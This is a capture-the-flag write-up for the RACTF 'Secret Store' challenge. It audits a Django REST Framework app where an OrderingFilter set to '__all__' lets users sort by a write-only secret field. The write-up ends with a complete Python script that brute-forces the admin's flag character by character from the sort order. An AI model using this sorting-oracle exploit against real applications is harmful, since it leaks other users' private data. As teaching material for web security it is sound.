## RACTF - Secret Store [ 300 points ] (6 solves)
**Description**

> How many secrets could a secret store store if a store could store
> secrets?

## General overview
The web app is a Django application where you can register/login as a user and save a secret text which shouldn't be visible to anyone else except you in your home page when you login. Other users can also post their own secret text and the goal is to find a way to stole the secret from other users in order to read the flag from the admin.
## Code audit
There is a rest framework implemented with [djangorestframework](https://pypi.org/project/djangorestframework/) for the secret text that users are posting. We can peek a look at his views and models inside the secret folder where the source is located. We can see the secret's model inside secret/models.py:

```python
class  Secret(models.Model):
	value  =  models.CharField(max_length=255)
	owner  =  models.OneToOneField(User, on_delete=CASCADE)
	last_updated  =  models.DateTimeField(auto_now=True)
	created  =  models.DateTimeField(auto_now_add=True)
```
And there is a model serializer for the model Secret inside secret/serializers.py:
```python
class  SecretSerializer(serializers.ModelSerializer):
	class  Meta:
		model  =  Secret
		fields  = ["id", "value", "owner", "last_updated", "created"]
		read_only_fields  = ["owner", "last_updated", "created"]
		extra_kwargs  = {"value": {"write_only": True}}

	def  create(self, validated_data):
		validated_data["owner"] =  self.context["request"].user
		if  Secret.objects.filter(owner=self.context["request"].user):
			return  super(SecretSerializer, self).update(Secret.objects.get(owner=self.context['request'].user), validated_data)
		return  super(SecretSerializer, self).create(validated_data)
```
From the serializer we can see that the fields owner, last_updated, created and (implicitly) the id are read only, and the value field is write only.
Inside secret/views.py we can see the views of the web app and what they are doing:
```python
class  SecretViewSet(viewsets.ModelViewSet):
	queryset  =  Secret.objects.all()
	serializer_class  =  SecretSerializer
	permission_classes  = (IsAuthenticated  &  IsSecretOwnerOrReadOnly,)
	filter_backends  = [filters.OrderingFilter]
	ordering_fields  =  "__all__"

class  RegisterFormView(CreateView):
	template_name  =  "registration/register.html"
	form_class  =  UserCreationForm
	model  =  User
	success_url  =  "/"

def  home(request):
	if  request.user.is_authenticated:
		secret  =  Secret.objects.filter(owner=request.user)
	if  secret:
		return  render(request, "home.html", context={"secret": secret[0].value})
	return  render(request, "home.html")
```
We can see the home page view which just asks the database if a logged in user has a secret and displays it to him if it does, inside the home page. Apart from this view we can see that is implemented a ViewSet which is basically an easy automated way to query the database and display to the user the results. In our case we can get a json with all read only fields of the Secret serializer for example visiting [http://challange/api/secret?format=json](https://www.django-rest-framework.org/api-guide/format-suffixes/) we get as a result:

    [{"id":1,"owner":1,"last_updated":"2021-08-04T21:55:59.750611Z","created":"2021-08-04T21:55:32.221867Z"},{"id":2,"owner":8,"last_updated":"2021-08-13T20:16:05.306976Z","created":"2021-08-13T20:16:05.307065Z"},{"id":3,"owner":12,"last_updated":"2021-08-13T22:17:15.718312Z","created":"2021-08-13T21:41:25.913725Z"},{"id":4,"owner":113,"last_updated":"2021-08-14T16:08:40.385043Z","created":"2021-08-14T16:07:45.011707Z"},{"id":5,"owner":111,"last_updated":"2021-08-14T17:50:00.910477Z","created":"2021-08-14T17:50:00.910544Z"},{"id":6,"owner":126,"last_updated":"2021-08-15T08:23:42.895236Z","created":"2021-08-15T08:04:32.918062Z"},{"id":7,"owner":129,"last_updated":"2021-08-15T08:53:06.531769Z","created":"2021-08-15T08:53:06.531818Z"},{"id":8,"owner":133,"last_updated":"2021-08-15T17:48:13.303999Z","created":"2021-08-15T12:34:30.069458Z"},{"id":9,"owner":134,"last_updated":"2021-08-15T17:17:50.206823Z","created":"2021-08-15T17:17:33.212906Z"}]
Reading carefully django's rest framework documentation for [OrderingFilter](https://www.django-rest-framework.org/api-guide/filtering/#orderingfilter) we can see that we can supply an ordering query parameter to filter (sort) out our json output to our needs. Reading further the documentation we spot the following line:

> If you are confident that the queryset being used by the view doesn't contain any sensitive data, you can also explicitly specify that a view should allow ordering on _any_ model field or queryset aggregate, by using the special value `'__all__'`.

Which is exactly our case :), our own little SecretViewSet specifies that we can filter by any field our query, so basically we can post a secret with initial value `ractf{` , order the output by `values` and compare our own secret value with the admin's secret value which i assume is the user with id=1 and owner=1.
## Exploit

```python
import requests
from bs4 import BeautifulSoup
import json
import string

def find_owner(orderings, owner):
    for i, ordering in enumerate(orderings):
        if ordering['owner'] == owner:
            return i
    
    #Owner not found in orderings
    return None

session = requests.Session()
url = 'http://challenge:port' # Change this
login_url = f'{url}/auth/login/'
logout_url = f'{url}/auth/logout/'
api_secret_url = f'{url}/api/secret/'

r = session.get(url = login_url)
parse = BeautifulSoup(r.text, "html.parser")

# Extract csrf token to be able to login
csrf_token = parse.find_all('input')[0]['value']

# You have to register agent007 first.
post_data = {
    'csrfmiddlewaretoken': csrf_token,
    'username': 'agent007',
    'password': 'SecretPassword007.'
}

flag = r'ractf{' # Final flag ractf{data_exf1l_via_s0rt1ng_0c66de47}

# Sign in to agent007
r = session.post(url  = login_url, 
                 data = post_data)

# Let's save some secrets ;)
r = session.post(url = api_secret_url, 
                 json = {
                     'value': flag
                 }, 
                 headers = {
                     'X-CSRFToken': session.cookies['csrftoken']
                 }
)

print(f'Status code === {r.status_code}')
_, owner, _, _ = json.loads(r.text).values() # Get our owner id in order to be able to recognize our position in the final orderings

# When positive means we surpassed the flag value
# When negative means we need to go forward
# When from negative becomes positive it means the previous character was the correct character of the nth pos of the flag
cmp = 0

alphabet = string.digits + ':_`' + string.ascii_letters + '}~'
while not '}' in flag:
    # Iterate through every character in the alphabet
    # Post the flag appended with this character as our little secret and compare the results to bruteforce the characters of the flag
    for c in alphabet:
        r = session.post(url = api_secret_url, 
                    json = {
                        'value': flag + c
                    }, 
                    headers = {
                        'X-CSRFToken': session.cookies['csrftoken']
                    }
        )
        
        orderings = json.loads(
            session.get(url = api_secret_url + '?format=json&ordering=value').text
        )
        
        orderings_user_idx = find_owner(orderings, owner)
        orderings_flag_idx = find_owner(orderings, owner = 1)
        cmp = orderings_flag_idx - orderings_user_idx
        if cmp < 0:
            prev_c = chr(ord(c)-1)
            print(flag + prev_c)
            flag += prev_c
            break
```

